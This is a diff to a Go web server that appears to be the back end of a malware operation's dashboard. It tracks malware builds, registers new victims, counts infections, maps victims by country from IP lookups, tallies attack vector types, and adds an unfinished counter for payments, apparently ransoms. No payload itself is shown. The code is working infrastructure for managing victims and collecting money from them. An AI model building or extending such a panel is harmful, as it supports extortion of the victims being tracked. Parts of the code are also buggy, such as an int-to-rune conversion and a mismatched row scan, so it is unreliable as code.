@@ -17,9 +17,14 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"reflect"
 	"strconv"
 	"text/template"
 )
+
+func debugger(debugLine string){
+	fmt.Println(debugLine)
+}
 
 type Malware struct {
 	Id            int
@@ -352,6 +357,7 @@ func CreateConfig(id int, version string){
 }
 
 func GetID(w http.ResponseWriter, r *http.Request) {
+	debugger("get id method")
 	db := dbConn()
 	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC LIMIT 1")
 	if err != nil {
@@ -371,6 +377,7 @@ func GetID(w http.ResponseWriter, r *http.Request) {
 		moveToLive(idString)
 		moveToVar(idString)
 		//dataenvelope := map[string]interface{}{"code": Id}
+		debugger(string(Id+1))
 		respond.With(w, r, http.StatusOK, Id+1)
 	}
 
@@ -380,6 +387,7 @@ func GetID(w http.ResponseWriter, r *http.Request) {
 func CreatedInfectedInfo(w http.ResponseWriter, r *http.Request){
 	//created-> malware sayısı
 	//infected -> victim sayısı
+	debugger("created infected")
 	db := dbConn()
 	selDB, err := db.Query("SELECT id FROM Malware ORDER BY id DESC LIMIT 1")
 	if err != nil {
@@ -404,15 +412,72 @@ func CreatedInfectedInfo(w http.ResponseWriter, r *http.Request){
 		}
 	}
 
-	resp := "{\"created\":"+ string(created) + ",\"infected\":"+string(infected)+"}"
+	resp := "{\"created\":"+ strconv.Itoa(created) + ",\"infected\":"+ strconv.Itoa(infected) +"}"
 	respond.With(w, r, http.StatusOK, resp)
 
 }
 
+//func Edit(w http.ResponseWriter, r *http.Request) {
+//	db := dbConn()
+//	nId := r.URL.Query().Get("id")
+//	selDB, err := db.Query("SELECT * FROM Employee WHERE id=?", nId)
+//	if err != nil {
+//		panic(err.Error())
+//	}
+//	emp := Employee{}
+//	for selDB.Next() {
+//		var id int
+//		var name, city string
+//		err = selDB.Scan(&id, &name, &city)
+//		if err != nil {
+//			panic(err.Error())
+//		}
+//		emp.Id = id
+//		emp.Name = name
+//		emp.City = city
+//	}
+//	tmpl.ExecuteTemplate(w, "Edit", emp)
+//	defer db.Close()
+//}
+
+type CountryCount struct {
+	Count string
+	CC string
+}
 
 func GetCountry(w http.ResponseWriter, r *http.Request){
-	jsonized ,_ := getJSON("SELECT country,COUNT(*) as count FROM IPWhois GROUP BY country ORDER BY count DESC ")
-	respond.With(w, r, http.StatusOK,jsonized)
+	jsonized ,_ := getJSON("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code ORDER BY count DESC ")
+	fmt.Println(jsonized)
+	fmt.Println(reflect.TypeOf(jsonized))
+
+	db := dbConn()
+	selDB, err := db.Query("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code")
+	if err != nil {
+		panic(err.Error())
+	}
+	var jsonResp string
+	jsonResp = "{"
+	notFirst := false
+	i := 0
+	for selDB.Next(){
+		var count string
+		var cc string
+		if notFirst {
+			jsonResp = jsonResp + ","
+		}
+		err = selDB.Scan(&cc,&count)
+		jsonResp = jsonResp +cc+":"+ count
+		if err != nil {
+			panic(err.Error())
+		}
+		notFirst=true
+	}
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Content-Type", "application/json")
+	jsonResp = jsonResp + "}"
+
+	respond.With(w, r, http.StatusOK,(jsonResp) )
+	i = i+1
 }
 
 func GetMoney(w http.ResponseWriter, r *http.Request){
@@ -425,6 +490,34 @@ func TypeCounter(w http.ResponseWriter, r *http.Request) {
 	jsonized ,_ := getJSON("SELECT attack_vector_type,COUNT(*) as count FROM AttackVector GROUP BY attack_vector_type ORDER BY count DESC ")
 	respond.With(w, r, http.StatusOK,jsonized)
 }
+
+type Money struct {
+	Amount int
+	Status int
+}
+
+func MoneyCounter(writer http.ResponseWriter, request *http.Request) {
+	db := dbConn()
+	selDB, err := db.Query("SELECT * FROM Money ORDER BY id DESC")
+	if err != nil {
+		panic(err.Error())
+	}
+	emp := Money{}
+	res := []Money{}
+	for selDB.Next() {
+		var amount int
+		var status int
+		err = selDB.Scan(&amount, &status)
+		if err != nil {
+			panic(err.Error())
+		}
+		emp.Amount = amount
+		emp.Status = status
+		res = append(res, emp)
+	}
+	fmt.Println(res)
+	//TODO
+}
 func main() {
 	log.Println("Server started on: http://localhost:8080")
 	http.HandleFunc("/Malwares", IndexMalware)
@@ -434,15 +527,18 @@ func main() {
 	http.HandleFunc("/getid",GetID)
 	http.HandleFunc("/mangirlar", GetMoney)
 	http.HandleFunc("/bolivar", GetCountry)
-	http.HandleFunc("/dashboard/status/country_stat", GetCountry)
+	http.HandleFunc("/dashboard/status/worldmap", GetCountry)
 	http.HandleFunc("/dashboard/status/createinfect", CreatedInfectedInfo)
 	http.HandleFunc("/dashboard/status/typescount", TypeCounter)
+	http.HandleFunc("/dashboard/status/paid", MoneyCounter)
 
 	//http.HandleFunc("/edit", Edit)
 	http.HandleFunc("/new", NewVictim)
 
 	http.ListenAndServe(":8080", nil)
 }
+
+
 
 
 
